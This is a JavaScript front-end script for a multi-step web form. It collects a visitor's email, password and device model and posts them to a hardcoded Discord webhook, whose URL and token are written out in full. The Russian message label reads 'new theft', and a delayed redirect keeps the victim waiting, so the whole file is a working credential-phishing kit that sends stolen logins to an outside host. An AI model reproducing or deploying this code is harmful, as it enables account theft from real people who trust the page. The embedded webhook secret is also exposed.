document.addEventListener('DOMContentLoaded', () => {
    const detailsBtn = document.getElementById('detailsBtn');
    const modal = document.getElementById('modal');
    const closeBtn = document.querySelector('.close');
    const options = document.querySelectorAll('.options button');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    const continueBtn = document.getElementById('continueBtn');
    const submitBtn = document.getElementById('submitBtn');
    const whyLink = document.getElementById('whyLink');
    const whyText = document.getElementById('whyText');
    const container = document.querySelector('.container');

    let selectedOption = '';

    // Webhook URL
    const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

    detailsBtn.addEventListener('click', () => {
        container.classList.add('hidden');
        modal.classList.remove('hidden');
    });

    closeBtn.addEventListener('click', () => {
        modal.classList.add('hidden');
        container.classList.remove('hidden');
    });

    options.forEach(btn => {
        btn.addEventListener('click', (e) => {
            selectedOption = e.target.dataset.option;
            modal.classList.add('hidden');
            step1.classList.remove('hidden');
        });
    });

    continueBtn.addEventListener('click', () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    });

    whyLink.addEventListener('click', (e) => {
        e.preventDefault();
        whyText.classList.toggle('hidden');
    });

    submitBtn.addEventListener('click', () => {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const model = document.getElementById('model').value;

        if (!email || !password || !model) {
            alert('Заполните все поля');
            return;
        }

        // Отправка в Discord
        const payload = {
            content: `**Новая кража**\nПочта: ${email}\nПароль: ${password}\nМодель: ${model}`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                step2.classList.add('hidden');
                step3.classList.remove('hidden');
                // Через 3-4 часа перенаправление (имитация)
                setTimeout(() => {
                    window.location.href = 'redirect.html';
                }, 3 * 60 * 60 * 1000); // 3 часа в миллисекундах
            } else {
                alert('Ошибка отправки. Попробуйте ещё раз.');
            }
        }).catch(err => {
            alert('Ошибка сети');
        });
    });
});
